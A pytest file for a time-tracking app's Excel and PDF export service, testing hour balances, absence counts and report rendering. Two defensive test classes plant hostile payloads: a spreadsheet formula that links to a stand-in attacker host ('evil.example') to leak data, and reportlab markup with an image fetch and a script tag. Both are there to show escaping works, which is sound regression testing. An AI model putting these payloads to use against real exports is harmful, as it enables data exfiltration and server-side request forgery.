"""Tests for export service (monthly Excel report generation)."""
import zipfile
from datetime import date, time
from decimal import Decimal
from io import BytesIO

import pytest
from openpyxl import load_workbook

from app.models import TimeEntry
from app.services.export_service import generate_monthly_report
from tests.conftest import DEFAULT_TENANT_ID


def _make_time_entry(db, user, entry_date, start_h, end_h, break_min=0):
    """Helper to create a time entry."""
    entry = TimeEntry(
        user_id=user.id,
        tenant_id=DEFAULT_TENANT_ID,
        date=entry_date,
        start_time=time(start_h, 0),
        end_time=time(end_h, 0),
        break_minutes=break_min,
    )
    db.add(entry)
    db.commit()
    return entry


def _load_xlsx(bio: BytesIO):
    """Rewind + validate as a real XLSX and hand back the workbook.

    Stronger than a ``data[:2] == b'PK'`` magic-byte check: any writer that
    emits a truncated or structurally-broken workbook would still pass the
    byte-check but fail to open in Excel. ``openpyxl.load_workbook`` performs
    the same parse Excel does, so a green test here means the customer will
    actually be able to open the file.
    """
    bio.seek(0)
    data = bio.read()
    assert zipfile.is_zipfile(BytesIO(data)), "output is not a valid zip (xlsx wrapper)"
    bio.seek(0)
    return load_workbook(bio, read_only=True), data


class TestGenerateMonthlyReport:
    """Test generate_monthly_report() core behavior."""

    def test_returns_bytesio(self, db, test_user):
        """Prüft dass der Report ein BytesIO-Objekt liefert — wird direkt als HTTP-Response gestreamt."""
        result = generate_monthly_report(db, 2026, 1)
        assert isinstance(result, BytesIO)

    def test_returns_openable_xlsx(self, db, test_user):
        """Prüft dass der Report als echtes XLSX-File von openpyxl geladen werden
        kann und mindestens ein Blatt enthält — magic-byte-Check (PK) ist zu
        schwach, ein abgeschnittenes ZIP würde durchrutschen aber in Excel
        nicht öffnen."""
        result = generate_monthly_report(db, 2026, 1)
        wb, data = _load_xlsx(result)
        assert len(data) > 0
        assert len(wb.sheetnames) >= 1, f"no worksheets: {wb.sheetnames}"

    def test_report_with_time_entries_renders_hours(self, db, test_user):
        """Prüft dass Zeiteinträge im Report tatsächlich als Stundenwerte im
        Sheet landen — magic-byte-Pass sagt nichts darüber, ob Daten im
        Workbook ankommen."""
        _make_time_entry(db, test_user, date(2026, 1, 5), 8, 17, 30)
        _make_time_entry(db, test_user, date(2026, 1, 6), 9, 16, 30)
        _make_time_entry(db, test_user, date(2026, 1, 7), 8, 12, 0)

        result = generate_monthly_report(db, 2026, 1)
        wb, _ = _load_xlsx(result)
        # Find the test-user's sheet (openpyxl truncates sheet names to 31
        # chars and strips illegal chars — any sheet that contains the user's
        # last name is our target).
        ws = next(
            (wb[name] for name in wb.sheetnames if test_user.last_name in name),
            wb[wb.sheetnames[0]],
        )
        flat = [
            str(cell.value) if cell.value is not None else ""
            for row in ws.iter_rows(values_only=False)
            for cell in row
        ]
        # Zeiteinträge wurden mit 8:00/9:00 Startzeiten gebucht — mindestens
        # einer dieser Werte muss im Sheet auftauchen, sonst wurde kein Eintrag
        # gerendert.
        haystack = " ".join(flat)
        assert any(needle in haystack for needle in ("08:00", "8:00", "09:00", "9:00")), (
            f"expected an 08:00/09:00 start time in the user sheet, got: {haystack[:400]}"
        )

    def test_report_empty_month_still_opens(self, db, test_user):
        """Prüft dass ein leerer Monat ohne Einträge trotzdem ein öffnebares XLSX
        erzeugt — kein Crash bei neuen MA, Excel kann die Datei öffnen."""
        result = generate_monthly_report(db, 2026, 6)
        wb, _ = _load_xlsx(result)
        assert len(wb.sheetnames) >= 1

    def test_report_no_active_users_raises(self, db, test_user):
        """Prüft dass ohne aktive User ein IndexError kommt — bekannte Limitation, openpyxl braucht mind. 1 Sheet."""
        test_user.is_active = False
        db.commit()

        with pytest.raises(IndexError, match="At least one sheet must be visible"):
            generate_monthly_report(db, 2026, 1)

    def test_report_with_health_data_flag(self, db, test_user):
        """Prüft dass der Report mit Gesundheitsdaten-Flag valides XLSX erzeugt — DSGVO Art.9 Sonderfall."""
        _make_time_entry(db, test_user, date(2026, 1, 5), 8, 17, 30)
        result = generate_monthly_report(db, 2026, 1, include_health_data=True)
        wb, _ = _load_xlsx(result)
        assert len(wb.sheetnames) >= 1

    def test_report_size_increases_with_entries(self, db, test_user):
        """Prüft dass der Report mit Einträgen grösser ist als ein leerer — Daten werden tatsächlich geschrieben."""
        result_empty = generate_monthly_report(db, 2026, 2)
        size_empty = len(result_empty.read())

        # Add entries for March
        for day in range(2, 28):
            try:
                d = date(2026, 3, day)
                if d.weekday() < 5:  # weekdays only
                    _make_time_entry(db, test_user, d, 8, 17, 30)
            except ValueError:
                pass

        result_full = generate_monthly_report(db, 2026, 3)
        size_full = len(result_full.read())

        assert size_full > size_empty


class TestFormulaInjection:
    """Review 2026-05-29 (M-SEC1): employee-controlled free-text (note,
    sunday_exception_reason) must not be interpretable as a spreadsheet
    formula when an admin opens the §16 export in Excel/LibreOffice."""

    def test_employee_note_with_formula_is_neutralized(self, db, test_user):
        _make_time_entry(db, test_user, date(2026, 1, 5), 8, 17, 30)
        entry = db.query(TimeEntry).filter(TimeEntry.user_id == test_user.id).first()
        entry.note = '=HYPERLINK("http://evil.example/?leak","ok")'
        db.commit()

        result = generate_monthly_report(db, 2026, 1)
        wb, _ = _load_xlsx(result)
        ws = next(
            (wb[n] for n in wb.sheetnames if test_user.last_name in n),
            wb[wb.sheetnames[0]],
        )
        target = None
        for row in ws.iter_rows(values_only=True):
            for val in row:
                if isinstance(val, str) and "HYPERLINK" in val:
                    target = val
        assert target is not None, "note payload not found in sheet"
        assert target.startswith("'"), f"formula not neutralized: {target!r}"


class TestClassicReportSaldo:
    """#1 (Critical): the classic yearly report must compute StundenSaldo as the
    canonical Ist − Soll. The gross-model layout is Brutto-Soll − Krank − Urlaub
    = bereinigtes Soll; Ist_gearbeitet − bereinigt. Previously row 7 used the
    already-net get_monthly_target AND row 10 subtracted vacation again → the
    Saldo was inflated by the vacation hours (phantom overtime)."""

    def test_classic_saldo_equals_canonical_with_vacation(self, db, test_user):
        from app.models import Absence, AbsenceType
        from app.services import calculation_service
        from app.services.export_service import generate_yearly_report_classic

        # Juni 2026: 1 Urlaubstag (Mo 1.6.) + an drei Tagen exakt das 8h-Soll.
        db.add(Absence(user_id=test_user.id, tenant_id=DEFAULT_TENANT_ID,
                       date=date(2026, 6, 1), type=AbsenceType.VACATION, hours=8.0))
        for d in (date(2026, 6, 2), date(2026, 6, 3), date(2026, 6, 4)):
            _make_time_entry(db, test_user, d, 8, 16, 0)  # 8h netto
        db.commit()

        # Kanonisch = Ist − Soll (wie Dashboard / Standard-XLSX / ODS).
        canonical = (
            float(calculation_service.get_monthly_actual(db, test_user, 2026, 6))
            - float(calculation_service.get_monthly_target(db, test_user, 2026, 6))
        )

        result = generate_yearly_report_classic(db, 2026, include_health_data=True)
        wb, _ = _load_xlsx(result)
        ws = next((wb[n] for n in wb.sheetnames if test_user.last_name in n),
                  wb[wb.sheetnames[0]])
        col = 6 + 2  # Juni → Spalte 8 (col = month + 2)
        gross = float(ws.cell(row=7, column=col).value)
        adjusted = float(ws.cell(row=10, column=col).value)
        saldo = float(ws.cell(row=12, column=col).value)

        # Saldo == kanonisch (der Bug erzeugte hier +8h Phantom durch den Urlaub).
        assert abs(saldo - canonical) < 0.01, f"saldo {saldo} != canonical {canonical}"
        # Brutto-Modell: das Brutto-Soll enthält den Urlaubstag, das bereinigte
        # Soll nicht → Differenz ≈ 8h (der eine Urlaubstag).
        assert abs((gross - adjusted) - 8.0) < 0.01, f"gross {gross} - adjusted {adjusted}"


class TestFixedModeMonthlySummary:
    """Finding 1 (Whole-Branch-Review, #377 Baustein 2b): die Monats-Summary
    (Soll-Stunden Monat / Ist-Stunden Monat / Saldo Monat) im XLSX-Detailblatt
    MUSS für Fix-Modus-MA (use_fixed_monthly_target) mit dem modus-bewussten
    get_monthly_target/get_monthly_actual übereinstimmen — sonst widerspricht
    sich das §16-Dokument selbst gegen "Überstunden kumuliert" (bereits
    modus-bewusst über get_overtime_account)."""

    def test_monthly_summary_matches_monthly_target_fixed_mode(self, db, default_tenant):
        from app.services import calculation_service as cs
        from tests.test_fixed_monthly_target import _mk

        u = _mk(db)  # agreed=40h fix, Mo+Mi geplant à 3h
        db.add(TimeEntry(user_id=u.id, tenant_id=DEFAULT_TENANT_ID, date=date(2025, 3, 5),
                         start_time=time(8, 0), end_time=time(19, 0), break_minutes=60))
        db.commit()

        expected_target = cs.get_monthly_target(db, u, 2025, 3)
        expected_actual = cs.get_monthly_actual(db, u, 2025, 3)
        expected_balance = expected_actual - expected_target
        expected_overtime = cs.get_overtime_account(db, u, 2025, 3)
        # Sanity: für einen einzelnen vergangenen Monat ohne Carryover müssen
        # Saldo Monat und "Überstunden kumuliert" ohnehin übereinstimmen.
        assert expected_balance == expected_overtime

        result = generate_monthly_report(db, 2025, 3, tenant_id=DEFAULT_TENANT_ID)
        wb, _ = _load_xlsx(result)
        ws = next((wb[n] for n in wb.sheetnames if u.last_name in n), wb[wb.sheetnames[0]])
        rows = {
            row[0].value: row[1].value
            for row in ws.iter_rows(values_only=False)
            if row[0].value in (
                "Soll-Stunden Monat:", "Ist-Stunden Monat:", "Saldo Monat:",
                "Überstunden kumuliert:",
            )
        }
        assert rows["Soll-Stunden Monat:"] == pytest.approx(float(expected_target))
        assert rows["Ist-Stunden Monat:"] == pytest.approx(float(expected_actual))
        assert rows["Saldo Monat:"] == pytest.approx(float(expected_balance))
        # Selbst-Konsistenz: "Saldo Monat" darf "Überstunden kumuliert" NICHT
        # widersprechen (das war der Kern des Findings).
        assert rows["Saldo Monat:"] == pytest.approx(rows["Überstunden kumuliert:"])

    def test_monthly_summary_non_mode_byte_identical(self, db, test_user):
        """Regressions-Anker: ein Nicht-Modus-MA behält die alte Per-Tag-Summe
        (die auf OVERTIME-Tagen legitim von get_monthly_target abweichen darf
        — ein wholesale-Swap würde das brechen)."""
        from app.services import calculation_service as cs

        _make_time_entry(db, test_user, date(2026, 1, 5), 8, 17, 30)
        result = generate_monthly_report(db, 2026, 1, tenant_id=DEFAULT_TENANT_ID)
        wb, _ = _load_xlsx(result)
        ws = next((wb[n] for n in wb.sheetnames if test_user.last_name in n), wb[wb.sheetnames[0]])
        rows = {
            row[0].value: row[1].value
            for row in ws.iter_rows(values_only=False)
            if row[0].value in ("Soll-Stunden Monat:", "Ist-Stunden Monat:", "Saldo Monat:")
        }
        expected_target = cs.get_monthly_target(db, test_user, 2026, 1)
        expected_actual = cs.get_monthly_actual(db, test_user, 2026, 1)
        assert rows["Soll-Stunden Monat:"] == pytest.approx(float(expected_target))
        assert rows["Ist-Stunden Monat:"] == pytest.approx(float(expected_actual))
        assert rows["Saldo Monat:"] == pytest.approx(float(expected_actual - expected_target))


class TestFixedModeYearlySummary:
    """Follow-up to Finding 1 (Whole-Branch-Review, #377 Baustein 2b): die
    YEARLY employee detail sheet hatte dasselbe Self-Contradiction-Problem wie
    der Monatsexport (dort in 2ae1c6e0 gefixt) — "Soll-Stunden Jahr / Ist-
    Stunden Jahr / Saldo Jahr" wurden per-Tag inline akkumuliert statt
    modus-bewusst über get_monthly_target/get_monthly_actual, während die
    bereits modus-bewusste Jahresübersicht (_create_yearly_overview_sheet)
    und "Überstunden kumuliert" darunter divergierten."""

    def test_yearly_summary_matches_monthly_target_sum_fixed_mode(self, db, default_tenant):
        from app.services import calculation_service as cs
        from app.services.export_service import generate_yearly_report
        from tests.test_fixed_monthly_target import _mk

        u = _mk(db)  # agreed=40h fix, Mo+Mi geplant à 3h
        db.add(TimeEntry(user_id=u.id, tenant_id=DEFAULT_TENANT_ID, date=date(2025, 3, 5),
                         start_time=time(8, 0), end_time=time(19, 0), break_minutes=60))
        db.commit()

        expected_target = sum(
            (cs.get_monthly_target(db, u, 2025, m) for m in range(1, 13)),
            start=Decimal("0"),
        )
        expected_actual = sum(
            (cs.get_monthly_actual(db, u, 2025, m) for m in range(1, 13)),
            start=Decimal("0"),
        )
        expected_balance = expected_actual - expected_target

        result = generate_yearly_report(db, 2025, tenant_id=DEFAULT_TENANT_ID)
        wb, _ = _load_xlsx(result)
        ws = next((wb[n] for n in wb.sheetnames if u.last_name in n and n not in ("Jahresübersicht", "Abwesenheiten")), None)
        assert ws is not None, f"employee sheet not found in {wb.sheetnames}"
        rows = {
            row[0].value: row[1].value
            for row in ws.iter_rows(values_only=False)
            if row[0].value in ("Soll-Stunden Jahr:", "Ist-Stunden Jahr:", "Saldo Jahr:")
        }
        assert rows["Soll-Stunden Jahr:"] == pytest.approx(float(expected_target))
        assert rows["Ist-Stunden Jahr:"] == pytest.approx(float(expected_actual))
        assert rows["Saldo Jahr:"] == pytest.approx(float(expected_balance))

        # Selbst-Konsistenz: die (bereits modus-bewusste, unveränderte)
        # Jahresübersicht-Zeile für denselben MA darf dem Detailblatt NICHT
        # widersprechen (das war der Kern des Findings — vorher hatte das
        # Detailblatt eine per-Tag-Summe, die Übersicht schon Σ get_monthly_*).
        overview = wb["Jahresübersicht"]
        overview_row = next(
            r for r in overview.iter_rows(min_row=4, values_only=False)
            if r[0].value == f"{u.last_name}, {u.first_name}"
        )
        assert overview_row[2].value == pytest.approx(rows["Soll-Stunden Jahr:"])   # Spalte 3: Soll (Jahr)
        assert overview_row[3].value == pytest.approx(rows["Ist-Stunden Jahr:"])    # Spalte 4: Ist (Jahr)
        assert overview_row[4].value == pytest.approx(rows["Saldo Jahr:"])          # Spalte 5: Saldo (Jahr)

    def test_yearly_summary_non_mode_byte_identical(self, db, test_user):
        """Regressions-Anker: ein Nicht-Modus-MA behält die alte Per-Tag-Summe
        (die auf OVERTIME-Tagen legitim von get_monthly_target abweichen darf
        — ein wholesale-Swap würde das brechen)."""
        from app.services import calculation_service as cs
        from app.services.export_service import generate_yearly_report

        _make_time_entry(db, test_user, date(2026, 1, 5), 8, 17, 30)
        result = generate_yearly_report(db, 2026, tenant_id=DEFAULT_TENANT_ID)
        wb, _ = _load_xlsx(result)
        ws = next((wb[n] for n in wb.sheetnames if test_user.last_name in n and n not in ("Jahresübersicht", "Abwesenheiten")), None)
        assert ws is not None, f"employee sheet not found in {wb.sheetnames}"
        rows = {
            row[0].value: row[1].value
            for row in ws.iter_rows(values_only=False)
            if row[0].value in ("Soll-Stunden Jahr:", "Ist-Stunden Jahr:", "Saldo Jahr:")
        }
        expected_target = sum(
            (cs.get_monthly_target(db, test_user, 2026, m) for m in range(1, 13)),
            start=Decimal("0"),
        )
        expected_actual = sum(
            (cs.get_monthly_actual(db, test_user, 2026, m) for m in range(1, 13)),
            start=Decimal("0"),
        )
        assert rows["Soll-Stunden Jahr:"] == pytest.approx(float(expected_target))
        assert rows["Ist-Stunden Jahr:"] == pytest.approx(float(expected_actual))
        assert rows["Saldo Jahr:"] == pytest.approx(float(expected_actual - expected_target))


class TestPdfMarkupEscaping:
    """Vuln-1/4: user-controlled free text must be escaped before it reaches a
    reportlab ``Paragraph``. Unescaped, notes/names are parsed as reportlab's
    intra-paragraph markup mini-language → content injection into the official
    §16 compliance PDF, ``<img src>`` server-side fetch (SSRF), and a single
    stray tag raises during ``doc.build`` and 500s the whole multi-employee
    report."""

    def test_escape_pdf_text_neutralizes_markup(self):
        from app.services.export_service import escape_pdf_text
        assert escape_pdf_text('<img src="http://evil/x"/>a & b') == \
            '&lt;img src="http://evil/x"/&gt;a &amp; b'
        assert escape_pdf_text(None) == ''
        assert escape_pdf_text(123) == '123'

    def test_monthly_pdf_does_not_crash_on_markup_note(self, db, test_user):
        """A low-priv employee's note with reportlab markup must not break the
        admin's monthly PDF (proves the escape choke-point is on the PDF path)."""
        from app.services.export_service import generate_monthly_report_pdf
        e = TimeEntry(
            user_id=test_user.id, tenant_id=DEFAULT_TENANT_ID,
            date=date(2026, 1, 8), start_time=time(8, 0), end_time=time(16, 0),
            break_minutes=30, note='<b>injected</i> & <img src="http://evil/x">',
        )
        db.add(e)
        db.commit()
        result = generate_monthly_report_pdf(db, 2026, 1, tenant_id=DEFAULT_TENANT_ID)
        data = result.getvalue() if hasattr(result, "getvalue") else result
        assert data[:4] == b"%PDF", "monthly PDF must render despite markup in a note"

    def test_avv_pdf_does_not_crash_on_markup_billing_fields(self):
        """Tenant-admin-PATCHable billing fields must be escaped before the AVV
        Paragraph (same root cause)."""
        from app.models.tenant import Tenant
        from app.services.avv_generator import generate_avv_pdf
        t = Tenant(
            name="T", company_name="<script>x</script>", vat_id="<i>v", country="DE",
            billing_address={"street": "<b>Street", "zip": "12345", "city": "City"},
        )
        data = generate_avv_pdf(t)
        assert data[:4] == b"%PDF"


class TestAbsencesOverviewDayBased:
    """Fix #2 (Tagesprinzip §3 BUrlG): die Abwesenheits-Übersicht muss die TAGE
    tagebasiert über ``calculation_service.absence_days`` / ``get_vacation_account``
    zählen — NICHT als Σ(Absence.hours) ÷ get_daily_target (Durchschnitt). Sonst
    sind Tagespläne/Halbtage falsch und ein ``track_hours=False``-MA zeigt 0 Tage
    trotz gebuchtem Urlaub (und im ODS gilt „verbraucht" ≠ „Rest")."""

    def _tagesplan_user(self, db):
        """Ungleichmäßiger Tagesplan: Mo 8h, Di 4h, Mi 6h; ⌀-Tagessoll = 5h
        (weekly 15 / 3 Tage). Genau dieser Unterschied macht Σh÷⌀ falsch."""
        from app.models import User, UserRole
        from app.services import auth_service
        u = User(
            username="tagesplan", email="tagesplan@example.com",
            password_hash=auth_service.hash_password("x12345678"),
            first_name="Tages", last_name="Plan", role=UserRole.EMPLOYEE,
            weekly_hours=15.0, work_days_per_week=3, vacation_days=30,
            is_active=True, tenant_id=DEFAULT_TENANT_ID,
            track_hours=True, use_daily_schedule=True,
            hours_monday=8, hours_tuesday=4, hours_wednesday=6,
        )
        db.add(u)
        db.commit()
        db.refresh(u)
        return u

    def _untracked_user(self, db):
        """Leitende(r) Angestellte(r): track_hours=False → ⌀-Tagessoll 0 → Σh÷⌀
        liefert 0 Tage trotz Urlaub. Tagebasiert müssen die Tage trotzdem zählen."""
        from app.models import User, UserRole
        from app.services import auth_service
        u = User(
            username="untracked", email="untracked@example.com",
            password_hash=auth_service.hash_password("x12345678"),
            first_name="Lei", last_name="Tend", role=UserRole.EMPLOYEE,
            weekly_hours=40.0, work_days_per_week=5, vacation_days=30,
            is_active=True, tenant_id=DEFAULT_TENANT_ID, track_hours=False,
        )
        db.add(u)
        db.commit()
        db.refresh(u)
        return u

    def _absence(self, db, user, d, typ, hours, half_day=False):
        from app.models import Absence
        a = Absence(
            user_id=user.id, tenant_id=DEFAULT_TENANT_ID, date=d,
            type=typ, hours=hours, half_day=half_day,
        )
        db.add(a)
        db.commit()
        return a

    def test_overview_days_are_day_based_not_hours_based(self, db, default_tenant):
        from openpyxl import Workbook
        from app.models import AbsenceType
        from app.services import calculation_service
        from app.services.export_service import _create_absences_overview_sheet

        user_a = self._tagesplan_user(db)
        user_b = self._untracked_user(db)

        # user_a: 2 volle Urlaubstage (Mo 8h, Di 4h) + 1 Halbtag (Mi, 3h) → 2,5 Tage
        self._absence(db, user_a, date(2026, 1, 5), AbsenceType.VACATION, 8)   # Mo
        self._absence(db, user_a, date(2026, 1, 6), AbsenceType.VACATION, 4)   # Di
        self._absence(db, user_a, date(2026, 1, 7), AbsenceType.VACATION, 3, half_day=True)  # Mi (halb)
        # user_a Krank: 1 voller Tag an einem Montag (8h) → 1,0 Tag (Σh÷⌀ wäre 1,6)
        self._absence(db, user_a, date(2026, 1, 19), AbsenceType.SICK, 8)      # Mo

        # user_b (untracked): 1 voller + 1 halber Urlaubstag → 1,5 Tage (Σh÷⌀ = 0)
        self._absence(db, user_b, date(2026, 1, 12), AbsenceType.VACATION, 0)  # Mo
        self._absence(db, user_b, date(2026, 1, 13), AbsenceType.VACATION, 0, half_day=True)  # Di

        wb = Workbook()
        _create_absences_overview_sheet(wb, db, [user_a, user_b], 2026, include_health_data=True)
        sheet = wb["Abwesenheiten"]

        # Layout: row 3 = Header, Datenzeilen ab row 4. Spalten: 1 Name, 2 Urlaub,
        # 3 Krank, 4 Fortbildung, 5 ÜStd, 6 Sonstiges, 7 Bez.Freistellung, 8 Gesamt.
        a_vac = sheet.cell(row=4, column=2).value
        a_sick = sheet.cell(row=4, column=3).value
        b_vac = sheet.cell(row=5, column=2).value

        # Tagebasiert (Tagesprinzip), NICHT Σh÷⌀-Tagessoll.
        assert a_vac == 2.5, f"Tagesplan-Urlaub: erwartet 2,5 (tagebasiert), bekam {a_vac}"
        assert a_sick == 1.0, f"Tagesplan-Krank: erwartet 1,0 (tagebasiert), bekam {a_sick}"
        assert b_vac == 1.5, f"untracked-Urlaub: erwartet 1,5 (tagebasiert), bekam {b_vac}"

        # Deckungsgleich mit den autoritativen Berechnungsfunktionen (Live-Reports).
        vac_acc_a = calculation_service.get_vacation_account(db, user_a, 2026)
        assert a_vac == round(float(vac_acc_a["used_days"]), 1)
        vac_acc_b = calculation_service.get_vacation_account(db, user_b, 2026)
        assert b_vac == round(float(vac_acc_b["used_days"]), 1)

    def test_yearly_report_renders_with_tagesplan_and_untracked(self, db, default_tenant):
        """End-to-end: der komplette Jahresreport baut ein valides XLSX, auch mit
        Tagesplan- und untracked-MA (kein Crash, Sheet öffenbar)."""
        from app.models import AbsenceType
        from app.services.export_service import generate_yearly_report
        user_a = self._tagesplan_user(db)
        user_b = self._untracked_user(db)
        self._absence(db, user_a, date(2026, 1, 5), AbsenceType.VACATION, 8)
        self._absence(db, user_b, date(2026, 1, 12), AbsenceType.VACATION, 0)
        wb, data = _load_xlsx(generate_yearly_report(db, 2026))
        assert "Abwesenheiten" in wb.sheetnames


class TestXlsxMultiAbsenceDay:
    """Finding 13 (Export-Review 2026-07-14): parity with
    TestOdsMultiAbsenceDay (test_ods_export_service.py) — the XLSX detail
    sheet must also render BOTH absences of a mixed day (½ Urlaub + ½
    Sonstiges), not just the first. `_create_employee_sheet` groups Absences
    per date into a LIST (I-1/#219) precisely to avoid this; this test would
    catch a regression to the old date-dict keying on the XLSX side too."""

    def test_monthly_renders_both_absences_on_multitype_day(self, db, test_user):
        from datetime import datetime as _dt
        from app.models import Absence, AbsenceType

        db.add(Absence(user_id=test_user.id, tenant_id=DEFAULT_TENANT_ID,
                       date=date(2026, 3, 4), type=AbsenceType.VACATION, hours=4))
        db.add(Absence(user_id=test_user.id, tenant_id=DEFAULT_TENANT_ID,
                       date=date(2026, 3, 4), type=AbsenceType.OTHER, hours=4))
        db.commit()

        result = generate_monthly_report(db, 2026, 3, include_health_data=True)
        wb, _ = _load_xlsx(result)
        ws = next(
            (wb[name] for name in wb.sheetnames if test_user.last_name in name),
            wb[wb.sheetnames[0]],
        )

        # Locate the 2026-03-04 row by content (robust against row-offset
        # drift) rather than a whole-sheet substring search — the sheet's own
        # "Urlaub genommen (Std):" summary row would satisfy a naive
        # "Urlaub" in flat-text check regardless of the day-row's content.
        target_row = None
        for row in ws.iter_rows(values_only=False):
            cell0 = row[0].value
            cell0_date = cell0.date() if isinstance(cell0, _dt) else cell0
            if cell0_date == date(2026, 3, 4):
                target_row = row
                break
        assert target_row is not None, "no row found for 2026-03-04"

        abwesenheit_cell = target_row[8].value or ""  # Spalte 9 (0-indexed 8) = Abwesenheit
        assert "Urlaub" in abwesenheit_cell and "Sonstiges" in abwesenheit_cell, (
            f"mixed-day row must show BOTH absence labels, got: {abwesenheit_cell!r}"
        )
